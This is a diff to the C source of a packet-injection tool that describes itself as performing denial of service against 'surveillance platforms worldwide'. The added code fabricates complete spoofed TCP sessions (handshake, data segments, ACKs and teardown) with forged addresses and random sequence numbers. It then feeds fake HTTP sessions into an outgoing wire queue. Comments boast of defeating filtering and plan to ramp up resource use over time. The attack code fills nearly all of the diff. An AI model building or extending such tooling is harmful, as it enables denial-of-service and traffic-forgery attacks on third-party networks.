@@ -1,3 +1,4 @@
+
 /*
 
 this is the main file which takes care of DoS against surveillance platforms worldwide
@@ -301,29 +302,19 @@ int AS_queue(AS_attacks *attack, PacketInfo *qptr) {
     optr->attack_info = attack;
 
     // link to outgoing queue (FIFO)
-    //L_link_ordered((LINK **)&network_queue, (LINK *)optr);
+    L_link_ordered((LINK **)&network_queue, (LINK *)optr);
 
     // this was a major reason it was slowing down.. didnt use a jump table or keep track of the last element..
     // since its supposed to go to wire.. lets just keep pushing it there and see how  quickly it functions.
-    optr->next = network_queue;
-    network_queue = optr;
+    /*optr->next = network_queue;
+    network_queue = optr; */
 
 
     return 1;
 }
 
 
-// *** strategy for repeat_interval needs to be worked into an algorithm taking considering of how long this system is released
-// it needs to progressively use more resources over time
-// this isnt just for a simple SYN (one packet trying to open a port)
-// depth will allow to go the entire handshake... 
-// the point is initially that the systems wont be prepared for these kinds of attacks...
-// but a start date will get put in (prob nov 4-5) which will be the date fromm when the depth will be calculated
-// after full connectioons are established (depth = 3) then it will rely on virtual connections as well
-// **
-// so do we generate session pacets into an array.. and then push to this function??
-//.....
-
+// queue an http session attack (generates, and plays HTTP requests to the wire)
 int AS_session_queue(int id, uint32_t src, uint32_t dst, int src_port, int dst_port, int count, int interval, int depth) {
     AS_attacks *aptr = NULL;
 
@@ -855,9 +846,11 @@ int BuildSinglePacket(PacketBuildInstructions *iptr) {
         p_tcp->ptcl 	= IPPROTO_TCP;
         p_tcp->tcpl 	= htons(TCPHSIZE + iptr->data_size);
         //memcpy(&p_tcp->tcp, &p->tcp, TCPHSIZE);
+
+        // make a custom checksum function which will take these 3 parameters separately and handle the checksum without
+        // allocating and copying.. *** optimize
         memcpy(&p_tcp->tcp, &p->tcp, TCPHSIZE);
-        memcpy(checkbuf + sizeof(struct pseudo_tcp),
-            iptr->options, iptr->options_size);
+        memcpy(checkbuf + sizeof(struct pseudo_tcp), iptr->options, iptr->options_size);
         memcpy(checkbuf + sizeof(struct pseudo_tcp) + iptr->options_size,
         iptr->data, iptr->data_size);        
         
@@ -1143,6 +1136,333 @@ int GenerateBuildInstructionsHTTP(AS_attacks *aptr, uint32_t server_ip, uint32_t
 }
 
 
+
+
+
+
+
+
+// this is a linked list so we can possible keep conectoin open over long periods of time pushing packet as needed... 
+typedef struct _connection_properties {
+	struct _connection_properties *next;
+
+	AS_attacks *aptr;
+	uint32_t server_ip;
+	uint32_t client_ip;
+	uint32_t server_port;
+	uint32_t client_port;
+	uint32_t server_identifier;
+	uint32_t client_identifier;
+	uint32_t server_seq;
+	uint32_t client_seq;
+    int ts;
+    int client_ttl;
+    int server_ttl;
+    int max_packet_size_client;
+    int max_packet_size_server;
+} ConnectionProperties;
+
+
+
+
+int GenerateTCPConnectionInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list) {
+    PacketBuildInstructions *bptr = NULL;
+    PacketBuildInstructions *build_list = NULL;
+    int packet_flags = 0;
+    int packet_ttl = 0;
+
+    // first we need to generate a connection syn packet..
+    packet_flags = TCP_FLAG_SYN|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW;
+    packet_ttl = cptr->client_ttl;
+    if ((bptr = BuildInstructionsNew(&build_list, cptr->client_ip, cptr->server_ip, cptr->client_port, cptr->server_port, packet_flags, packet_ttl)) == NULL) goto err;
+    bptr->header_identifier = cptr->client_identifier++;
+    bptr->client = 1; // so it can generate source port again later... for pushing same messages w out full reconstruction
+    bptr->ack = 0;
+    bptr->seq = cptr->client_seq++;  
+
+    // then nthe server needs to respond acknowledgng it
+    packet_flags = TCP_FLAG_SYN|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW;
+    packet_ttl = cptr->server_ttl;
+    if ((bptr = BuildInstructionsNew(&build_list, cptr->server_ip, cptr->client_ip, cptr->server_port, cptr->client_port, packet_flags, packet_ttl)) == NULL) goto err;
+    bptr->header_identifier = cptr->server_identifier++;
+    bptr->ack = cptr->client_seq;
+    bptr->seq = cptr->server_seq++;
+
+    // then the client must respond acknowledging that servers response..
+    packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
+    packet_ttl = cptr->client_ttl;
+    if ((bptr = BuildInstructionsNew(&build_list, cptr->client_ip, cptr->server_ip, cptr->client_port, cptr->server_port, packet_flags, packet_ttl)) == NULL) goto err;
+    bptr->header_identifier = cptr->client_identifier++;
+    bptr->client = 1;
+    bptr->ack = cptr->server_seq;
+    bptr->seq = cptr->client_seq;
+
+    L_link_ordered((LINK **)final_build_list, (LINK *)build_list);
+
+    return 1;
+    err:;
+    printf("err\n");
+    return 0;
+}
+
+// sending from client, or server?
+int GenerateTCPSendDataInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list, int from_client, char *data, int size) {
+    PacketBuildInstructions *bptr = NULL;
+    PacketBuildInstructions *build_list = NULL;
+    int packet_flags = 0;
+    int packet_size;
+    char *data_ptr = data;
+    int data_size = size;
+    int packet_ttl = 0;
+    uint32_t source_ip;
+    uint32_t source_port;
+    uint32_t dest_ip;
+    uint32_t dest_port;
+    uint32_t *src_identifier = NULL;
+    uint32_t *dst_identifier = NULL;
+    uint32_t *my_seq = NULL;
+    uint32_t *remote_seq = NULL;
+
+    // prepare variables depending on the side of the that the data is going from -> to
+    if (from_client) {
+        source_ip = cptr->client_ip;
+        source_port = cptr->client_port;
+        dest_ip = cptr->server_ip;
+        dest_port = cptr->server_port;
+        src_identifier = &cptr->client_identifier;
+        dst_identifier = &cptr->server_identifier;
+        my_seq = &cptr->client_seq;
+        remote_seq = &cptr->server_seq;
+    } else {
+        source_ip = cptr->server_ip;
+        source_port = cptr->server_port;
+        dest_ip = cptr->client_ip;
+        dest_port = cptr->client_port;
+        src_identifier = &cptr->server_identifier;
+        dst_identifier = &cptr->client_identifier;
+        my_seq = &cptr->server_seq;
+        remote_seq = &cptr->client_seq;
+    }
+
+
+    // now the client must loop until it sends all daata
+    while (data_size > 0) {
+        
+                packet_size = min(data_size, from_client ? cptr->max_packet_size_client : cptr->max_packet_size_server);
+        
+                // the client sends its request... split into packets..
+                packet_flags = TCP_FLAG_PSH|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
+                packet_ttl = from_client ? cptr->client_ttl : cptr->server_ttl;
+                if ((bptr = BuildInstructionsNew(&build_list, source_ip, dest_ip, source_port, dest_port, packet_flags, packet_ttl)) == NULL) goto err;
+                if (DataPrepare(&bptr->data, data_ptr, packet_size) != 1) goto err;
+                bptr->data_size = packet_size;
+                bptr->header_identifier = *src_identifier++;
+                bptr->client = from_client;
+                bptr->ack = *remote_seq;
+                bptr->seq = *my_seq;
+            
+                *my_seq += packet_size;
+        
+                data_size -= packet_size;
+                data_ptr += packet_size;
+        
+                // server sends ACK packet for this packet
+                packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
+                packet_ttl = from_client ? cptr->server_ttl : cptr->client_ttl;
+                if ((bptr = BuildInstructionsNew(&build_list, dest_ip, source_ip, dest_port, source_port, packet_flags, packet_ttl)) == NULL) goto err;
+                bptr->header_identifier = *dst_identifier++;
+                bptr->ack = *my_seq;
+                bptr->seq = *remote_seq;
+                bptr->client = !from_client;
+        
+            }
+
+            L_link_ordered((LINK **)final_build_list, (LINK *)build_list);
+
+
+    return 1;
+    err:;
+    printf("err\n");
+    return 0;
+}
+
+int GenerateTCPCloseConnectionInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list, int from_client) {
+    PacketBuildInstructions *bptr = NULL;
+    PacketBuildInstructions *build_list = NULL;
+    int packet_flags = 0;
+    int packet_size = 0;
+
+    uint32_t source_ip;
+    uint32_t source_port;
+    uint32_t dest_ip;
+    uint32_t dest_port;
+    uint32_t *src_identifier = NULL;
+    uint32_t *dst_identifier = NULL;
+    uint32_t *my_seq = NULL;
+    uint32_t *remote_seq = NULL;
+    int packet_ttl;
+
+    // prepare variables depending on the side of the that the data is going from -> to
+    if (from_client) {
+        source_ip = cptr->client_ip;
+        source_port = cptr->client_port;
+        dest_ip = cptr->server_ip;
+        dest_port = cptr->server_port;
+        src_identifier = &cptr->client_identifier;
+        dst_identifier = &cptr->server_identifier;
+        my_seq = &cptr->client_seq;
+        remote_seq = &cptr->server_seq;
+    } else {
+        source_ip = cptr->server_ip;
+        source_port = cptr->server_port;
+        dest_ip = cptr->client_ip;
+        dest_port = cptr->client_port;
+        src_identifier = &cptr->server_identifier;
+        dst_identifier = &cptr->client_identifier;
+        my_seq = &cptr->server_seq;
+        remote_seq = &cptr->client_seq;
+    }
+
+
+    // source (client or server) sends FIN packet...
+    packet_flags = TCP_FLAG_FIN|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
+    packet_ttl = from_client ? cptr->client_ttl : cptr->server_ttl;
+    if ((bptr = BuildInstructionsNew(&build_list, source_ip, dest_ip, source_port, dest_port, packet_flags, packet_ttl)) == NULL) goto err;
+    bptr->header_identifier = *src_identifier++;
+    bptr->ack = *remote_seq;
+    bptr->seq = *my_seq;
+    *my_seq += 1;
+    bptr->client = from_client;
+    
+    // other side needs to respond..
+    packet_flags = TCP_FLAG_FIN|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
+    packet_ttl = from_client ? cptr->server_ttl : cptr->client_ttl;
+    if ((bptr = BuildInstructionsNew(&build_list, dest_ip, source_ip, dest_port, source_port, packet_flags, packet_ttl)) == NULL) goto err;
+    bptr->header_identifier = *(src_identifier)++;
+    bptr->ack = *my_seq;
+
+    bptr->seq = *remote_seq;
+    *remote_seq += 1;
+    
+    bptr->client = !from_client;
+
+    // source (client or server) sends FIN packet...
+    packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
+    packet_ttl = from_client ? cptr->client_ttl : cptr->server_ttl;
+    if ((bptr = BuildInstructionsNew(&build_list, source_ip, dest_ip, source_port, dest_port, packet_flags, packet_ttl)) == NULL) goto err;
+    bptr->header_identifier = *(src_identifier)++;
+    bptr->ack = *remote_seq;
+    bptr->seq = *my_seq;
+    bptr->client = from_client;
+
+    L_link_ordered((LINK **)final_build_list, (LINK *)build_list);
+
+    return 1;
+    err:;
+    printf("err\n");
+    return -1;
+}
+
+
+
+
+
+
+
+
+/*
+
+this new way to build connections allows doing many different packets from source to dest, etc, etc...
+it should allow all protocols TCP/IP
+*/
+
+int BuildHTTPSession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, uint32_t server_port,  char *client_body,  int client_size, char *server_body, int server_size) {
+    PacketBuildInstructions *bptr = NULL;
+    PacketBuildInstructions *build_list = NULL;
+    ConnectionProperties cptr;
+
+    // decide OS later..
+    int client_emulation = 0;
+    int server_emulation = 0;
+
+    // what do we need for building all packets?
+    int packet_size = 0;
+    // for SYN,ACK,FIN,etc... up to OPTIONS(timestamp+window size)
+    int packet_flags = 0;
+    // packet time to live
+    int packet_ttl = 64;
+
+    char *client_body_ptr = client_body;
+    char *server_body_ptr = server_body;
+
+    // these are in headers.. and seems to be +1 fromm start..
+    // we need to get more requests for when they begin to *attempt* to filter these out..
+    // good luck with that.
+    uint32_t client_identifier = rand()%0xFFFFFFFF;
+    uint32_t server_identifier = rand()%0xFFFFFFFF;
+
+    // os emulation and general statistics required here from operating systems, etc..
+    //// find correct MTU, subtract headers.. calculate.
+    // this is the max size of each packet while sending the bodies...
+    int max_packet_size_client = 1500; 
+    int max_packet_size_server = 1500; 
+
+    int client_port = 1024 + (rand()%(65535-1024));
+
+    uint32_t client_seq = rand()%0xFFFFFFFF;
+    uint32_t server_seq = rand()%0xFFFFFFFF;
+
+
+    cptr.server_ip = server_ip;
+    cptr.server_port = server_port;
+    cptr.client_ip = client_ip;
+    cptr.client_port = client_port;
+    cptr.ts = time(0);
+    cptr.max_packet_size_client = max_packet_size_client;
+    cptr.max_packet_size_server = max_packet_size_server;
+    cptr.server_ttl = 53;
+    cptr.client_ttl = 64;
+    cptr.server_identifier = server_identifier;
+    cptr.client_identifier = client_identifier;
+    cptr.aptr = aptr;
+
+    // open the connection...
+    if (GenerateTCPConnectionInstructions(&cptr, &build_list) != 1) goto err;
+
+    // now we must send data from client to server (request)
+    if (GenerateTCPSendDataInstructions(&cptr, &build_list, 1,
+        client_body, client_size) != 1) goto err;
+    
+    // now the server must respond with its body..
+    // now we must send data from client to server (request)
+    if (GenerateTCPSendDataInstructions(&cptr, &build_list, 0,
+        server_body, server_size) != 1) goto err;
+
+    // now lets close the connection from client side...
+    if (GenerateTCPCloseConnectionInstructions(&cptr, &build_list, 1) != 1) goto err;
+
+    aptr->packet_build_instructions = build_list;
+    // all packets done! good to go!
+    return 1;
+    err:;
+    printf("error\n");
+    return -1;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 char *G_client_body = NULL;
 char *G_server_body = NULL;
 int G_client_body_size = 0;
@@ -1157,8 +1477,9 @@ void *HTTP_Create(AS_attacks *aptr) {
     printf("client body %p size %d\nserver body %p size %d\n",G_client_body, G_client_body_size, G_server_body, G_server_body_size);
 #endif
 
-    i = GenerateBuildInstructionsHTTP(aptr,aptr->dst, aptr->src, aptr->destination_port, G_client_body, G_client_body_size,G_server_body, G_server_body_size);
-    
+    //i = GenerateBuildInstructionsHTTP(aptr,aptr->dst, aptr->src, aptr->destination_port, G_client_body, G_client_body_size,G_server_body, G_server_body_size);
+    // lets try new method    
+    i = BuildHTTPSession(aptr,aptr->dst, aptr->src, aptr->destination_port, G_client_body, G_client_body_size,G_server_body, G_server_body_size);
 
     BuildPackets(aptr);
 
